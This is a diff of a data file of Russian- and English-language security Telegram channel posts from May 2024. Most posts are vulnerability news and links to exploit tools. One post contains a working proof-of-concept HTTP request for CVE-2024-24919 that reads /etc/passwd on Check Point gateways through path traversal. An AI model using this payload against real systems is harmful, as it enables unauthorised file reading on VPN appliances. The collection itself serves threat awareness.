@@ -1,7 +1,8 @@
 {
-    "date": "2024-06-04",
+    "date": "2024-05-30",
     "from_channel": "freedomf0x",
-    "message": "#CVE-2024-24919. Эта уязвимость в Check Point Remote Access VPN позволяет читать файлы на хосте (LFI), с привилегиями root. Уязвимыми являются следующие продукты:\n\n  - CloudGuard Network\n  - Quantum Maestro\n  - Quantum Scalable Chassis\n  - Quantum Security Gateways\n  - Quantum Spark Appliances\n\n- Версии:\n  - R77.20 (EOL)\n  - R77.30 (EOL)\n  - R80.10 (EOL)\n  - R80.20 (EOL)\n  - R80.20.x\n  - R80.20SP (EOL)\n  - R80.30 (EOL)\n  - R80.30SP (EOL)\n  - R80.40 (EOL)\n  - R81\n  - R81.10\n  - R81.10.x\n  - R81.20\n\n#POC\n\nPOST /clients/MyCRL HTTP/1.1 \nHost: target_host \nContent-Length: 63 \n\naCSHELL/../../../../../../../etc/passwd"
+    "message": "#CVE-2024-24919. Эта уязвимость в Check Point Remote Access VPN позволяет читать файлы на хосте (LFI), с привилегиями root. Уязвимыми являются следующие продукты:\n\n  - CloudGuard Network\n  - Quantum Maestro\n  - Quantum Scalable Chassis\n  - Quantum Security Gateways\n  - Quantum Spark Appliances\n\n- Версии:\n  - R77.20 (EOL)\n  - R77.30 (EOL)\n  - R80.10 (EOL)\n  - R80.20 (EOL)\n  - R80.20.x\n  - R80.20SP (EOL)\n  - R80.30 (EOL)\n  - R80.30SP (EOL)\n  - R80.40 (EOL)\n  - R81\n  - R81.10\n  - R81.10.x\n  - R81.20\n\n#POC\n\nPOST /clients/MyCRL HTTP/1.1 \nHost: target_host \nContent-Length: 63 \n\naCSHELL/../../../../../../../etc/passwd",
+    "urls": []
 }
 {
     "date": "2024-05-30",
@@ -16,12 +17,14 @@
 {
     "date": "2024-05-24",
     "from_channel": "defcon_news",
-    "message": "Google Detects 4th Chrome Zero-Day in May Actively Under Attack - Update ASAP\nhttps://thehackernews.com/2024/05/google-detects-4th-chrome-zero-day-in.html"
+    "message": "Google Detects 4th Chrome Zero-Day in May Actively Under Attack - Update ASAP\nhttps://thehackernews.com/2024/05/google-detects-4th-chrome-zero-day-in.html",
+    "urls": []
 }
 {
     "date": "2024-05-24",
     "from_channel": "RalfHackerChannel",
     "message": "CVE-2024-21683: Confluence Auth RCE\n\nhttps://github.com/W01fh4cker/CVE-2024-21683-RCE\n\n#exploit #git #web",
+    "urls": [],
     "webpage_description": "CVE-2024-21683 Confluence Post Auth RCE. Contribute to W01fh4cker/CVE-2024-21683-RCE development by creating an account on GitHub.",
     "webpage_url": "https://github.com/W01fh4cker/CVE-2024-21683-RCE"
 }
@@ -41,19 +44,21 @@
     "message": "🖋️ Critical Veeam Backup Enterprise Manager Flaw Allows Authentication Bypass 🖋️\n\nUsers of Veeam Backup Enterprise Manager are being urged to update to the latest version following the discovery of a critical security flaw that could permit an adversary to bypass authentication protections. Tracked as CVE202429849 CVSS score 9.8, the vulnerability could allow an unauthenticated attacker to log in to the Veeam Backup Enterprise Manager web interface as.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
 }
 {
-    "date": "2024-05-22",
+    "date": "2024-05-21",
     "from_channel": "cibsecurity",
     "message": "🖋️ NextGen Healthcare Mirth Connect Under Attack - CISA Issues Urgent Warning 🖋️\n\nThe U.S. Cybersecurity and Infrastructure Security Agency CISA on Monday added a security flaw impacting NextGen Healthcare Mirth Connect to its Known Exploited Vulnerabilities KEV catalog, citing evidence of active exploitation. The flaw, tracked as CVE202343208 CVSS score NA, concerns a case of unauthenticated remote code execution arising from an incomplete.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
 }
 {
     "date": "2024-05-18",
     "from_channel": "freedomf0x",
-    "message": "#CVE-2024-22120: Time Based SQL Injection in #Zabbix Server Audit Log"
+    "message": "#CVE-2024-22120: Time Based SQL Injection in #Zabbix Server Audit Log",
+    "urls": []
 }
 {
     "date": "2024-05-18",
     "from_channel": "RalfHackerChannel",
-    "message": "CVE-2024-22120: Time Based SQL Injection in Zabbix Server Audit Log\n\nAffected and fixed version/s: \n* 6.0.0 - 6.0.27 / 6.0.28rc1\n* 6.4.0 - 6.4.12 / 6.4.13rc1\n* 7.0.0alpha1 - 7.0.0beta1 / 7.0.0beta2\n\nAllows to dump any values from database. As an example of exploit above allows privilege escalation from user to admin. In some cases, SQL injection leads to RCE.\n\nPoC: https://support.zabbix.com/secure/attachment/236280/236280_zabbix_server_time_based_blind_sqli.py\n\n#exploit #pentest"
+    "message": "CVE-2024-22120: Time Based SQL Injection in Zabbix Server Audit Log\n\nAffected and fixed version/s: \n* 6.0.0 - 6.0.27 / 6.0.28rc1\n* 6.4.0 - 6.4.12 / 6.4.13rc1\n* 7.0.0alpha1 - 7.0.0beta1 / 7.0.0beta2\n\nAllows to dump any values from database. As an example of exploit above allows privilege escalation from user to admin. In some cases, SQL injection leads to RCE.\n\nPoC: https://support.zabbix.com/secure/attachment/236280/236280_zabbix_server_time_based_blind_sqli.py\n\n#exploit #pentest",
+    "urls": []
 }
 {
     "date": "2024-05-18",
@@ -61,11 +66,16 @@
     "message": "CVE-2024-22120 Zabbix Server \n*\nTime Based SQL Injection\n*\nТех детали\n*\nexploit\n\n#zabbix"
 }
 {
-    "date": "2024-07-30",
+    "date": "2024-05-17",
     "from_channel": "cibsecurity",
     "message": "🕵️‍♂️ Intel Discloses Max Severity Bug in Its AI Model Compression Software 🕵️‍♂️\n\nThe improper input validation issue in Intel Neural Compressor enables remote attackers to execute arbitrary code on affected systems.\n\n📖 Read more.\n\n🔗 Via \"Dark Reading\"\n\n----------\n👁️ Seen on @cibsecurity",
     "webpage_description": "The improper input validation issue in Intel Neural Compressor enables remote attackers to execute arbitrary code on affected systems.",
     "webpage_url": "https://www.darkreading.com/cyber-risk/intel-discloses-max-severity-bug-in-its-ai-model-compression-software"
+}
+{
+    "date": "2024-05-16",
+    "from_channel": "it_secur",
+    "message": "👾 Awesome Vulnerable Applications.\n\n•  Подборка заранее уязвимых приложений, сервисов, ОС и пр. для вашего обучения, либо тестирования различного рода сканеров:\n\n - Online;\n - Paid;\n - Vulnerable VMs;\n - Cloud Security;\n - SSO - Single Sign On;\n - Mobile Security;\n+ OWASP Top 10;\n  - SQL Injection;\n  - XSS Injection;\n  - Server Side Request Forgery;\n  - CORS Misconfiguration;\n  - XXE Injection;\n  - Request Smuggling;\n + Technologies;\n  - WordPress;\n  - Node.js;\n  - Firmware;\n - Uncategorized.\n\n➡️ https://github.com/vavkamil/awesome-vulnerable-apps/\n\n#Пентест"
 }
 {
     "date": "2024-05-16",
@@ -75,12 +85,14 @@
 {
     "date": "2024-05-16",
     "from_channel": "defcon_news",
-    "message": "Google Patches Yet Another Actively Exploited Chrome Zero-Day Vulnerability\nhttps://thehackernews.com/2024/05/google-patches-yet-another-actively.html"
+    "message": "Google Patches Yet Another Actively Exploited Chrome Zero-Day Vulnerability\nhttps://thehackernews.com/2024/05/google-patches-yet-another-actively.html",
+    "urls": []
 }
 {
     "date": "2024-05-15",
     "from_channel": "defcon_news",
     "message": "Hakuin - A Blazing Fast Blind SQL Injection Optimization And Automation Framework\nhttp://www.kitploit.com/2024/05/hakuin-blazing-fast-blind-sql-injection.html",
+    "urls": [],
     "webpage_url": "https://www.kitploit.com/2024/05/hakuin-blazing-fast-blind-sql-injection.html?utm_source=dlvr.it&utm_medium=twitter"
 }
 {
@@ -93,7 +105,8 @@
 {
     "date": "2024-05-14",
     "from_channel": "defcon_news",
-    "message": "New Chrome Zero-Day Vulnerability CVE-2024-4761 Under Active Exploitation\nhttps://thehackernews.com/2024/05/new-chrome-zero-day-vulnerability-cve.html"
+    "message": "New Chrome Zero-Day Vulnerability CVE-2024-4761 Under Active Exploitation\nhttps://thehackernews.com/2024/05/new-chrome-zero-day-vulnerability-cve.html",
+    "urls": []
 }
 {
     "date": "2024-05-14",
@@ -104,6 +117,7 @@
     "date": "2024-05-13",
     "from_channel": "defcon_news",
     "message": "[KIS-2024-04] Cacti <= 1.2.26 Remote Code Execution Vulnerability\nhttps://www.reddit.com/r/netsec/comments/1cqurbm/kis202404_cacti_1226_remote_code_execution/",
+    "urls": [],
     "webpage_description": "Posted by eg1x - 1 vote and no comments",
     "webpage_url": "https://www.reddit.com/r/netsec/comments/1cqurbm/kis202404_cacti_1226_remote_code_execution/"
 }
@@ -122,19 +136,22 @@
 {
     "date": "2024-05-10",
     "from_channel": "defcon_news",
-    "message": "Chrome Zero-Day Alert — Update Your Browser to Patch New Vulnerability\nhttps://thehackernews.com/2024/05/chrome-zero-day-alert-update-your.html"
+    "message": "Chrome Zero-Day Alert — Update Your Browser to Patch New Vulnerability\nhttps://thehackernews.com/2024/05/chrome-zero-day-alert-update-your.html",
+    "urls": []
 }
 {
     "date": "2024-05-09",
     "from_channel": "defcon_news",
     "message": "Digging for SSRF in NextJS apps\nhttps://www.reddit.com/r/netsec/comments/1coa6vr/digging_for_ssrf_in_nextjs_apps/",
+    "urls": [],
     "webpage_description": "Posted by Mempodipper - 4 votes and no comments",
     "webpage_url": "https://www.reddit.com/r/netsec/comments/1coa6vr/digging_for_ssrf_in_nextjs_apps/"
 }
 {
     "date": "2024-05-08",
     "from_channel": "defcon_news",
-    "message": "Hijack Loader Malware Employs Process Hollowing, UAC Bypass in Latest Version\nhttps://thehackernews.com/2024/05/hijack-loader-malware-employs-process.html"
+    "message": "Hijack Loader Malware Employs Process Hollowing, UAC Bypass in Latest Version\nhttps://thehackernews.com/2024/05/hijack-loader-malware-employs-process.html",
+    "urls": []
 }
 {
     "date": "2024-05-08",
@@ -142,9 +159,15 @@
     "message": "🖋️ Hijack Loader Malware Employs Process Hollowing, UAC Bypass in Latest Version 🖋️\n\nA newer version of a malware loader called Hijack Loader has been observed incorporating an updated set of antianalysis techniques to fly under the radar. \"These enhancements aim to increase the malware's stealthiness, thereby remaining undetected for longer periods of time,\" Zscaler ThreatLabz researcher Muhammed Irfan V A said in a technical report. \"Hijack.\n\n📖 Read more.\n\n🔗 Via \"The Hacker News\"\n\n----------\n👁️ Seen on @cibsecurity"
 }
 {
+    "date": "2024-05-06",
+    "from_channel": "it_secur",
+    "message": "👩‍💻 Attacking Java.\n\n•  Язык программирования Java является одним из самых распространенных языков программирования. На нем написано множество сложных приложений как под Linux, так и под Windows. Однако, как и у любого другого языка программирования, у Java есть свои уязвимости.\n\n•  Цель этой статьи познакомиться с уязвимостями, типичными для языка программирования Java, а также разобрать практики безопасной разработки.\n\n•  Spring Boot Actuators Jolokia reloadByURL JNDI Injection;\n•  Understanding the Vulnerability;\n•  Static Vulnerability Analysis;\n•  Remote Class Loading;\n•  Deserialization of Untrusted Data;\n•  Java URI Filter Bypasses and Remote Code Execution;\n•  startsWith Directory Traversal;\n•  endsWith Path Parameter Injection;\n•  Request Forwarding Authentication Bypasses;\n•  Deserialization of Untrusted Data 102;\n•  Object Validation;\n•  java rmi;\n•  jmx security issues;\n•  MBean Writing and Control;\n•  java dynamic proxy;\n•  Static Proxy;\n•  Dynamic Proxy;\n•  Cglib Proxy;\n•  java reflection mechanism;\n•  Use cases of common libraries for XML parsing in XXE;\n•  XXE-DocumentBuilder.\n\n#Java #devsecops"
+}
+{
     "date": "2024-05-04",
     "from_channel": "freedomf0x",
     "message": "0day vulnerability discovery for bypassing Antimalware Scan Interface (#AMSI)\n\nhttps://github.com/V-i-x-x/AMSI-BYPASS",
+    "urls": [],
     "webpage_description": "\"AMSI WRITE RAID\" Vulnerability that leads to an effective AMSI BYPASS - V-i-x-x/AMSI-BYPASS",
     "webpage_url": "https://github.com/V-i-x-x/AMSI-BYPASS"
 }
@@ -152,5 +175,11 @@
     "date": "2024-05-04",
     "from_channel": "defcon_news",
     "message": "JS-Tap - JavaScript Payload And Supporting Software To Be Used As XSS Payload Or Post Exploitation Implant To Monitor Users As They Use The Targeted Application\nhttp://www.kitploit.com/2024/05/js-tap-javascript-payload-and.html",
+    "urls": [],
     "webpage_url": "https://www.kitploit.com/2024/05/js-tap-javascript-payload-and.html?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2024-05-02",
+    "from_channel": "it_secur",
+    "message": "👩‍💻 Attacking PHP.\n\n•  ZZZPHP ISSESSION adminid Authentication Bypass;\n•  ZZZPHP parserIfLabel eval PHP Code Injection;\n•  The Ev1l eva1 Deny list;\n•  Shopware PHP Object Instantiation;\n•  XML Parsing;\n•  Crafting the SimpleXMLElement Object for Object Injection;\n•  Pivot Primitives;\n•  Generating a Malicious Phar;\n•  Technique for POP chain development;\n•  Type Juggling;\n•  Time of Check Time of Use (TOCTOU);\n•  Race Condition;\n•  Laravel Framework vs laravel.log.\n\n#Php #devsecops"
 }
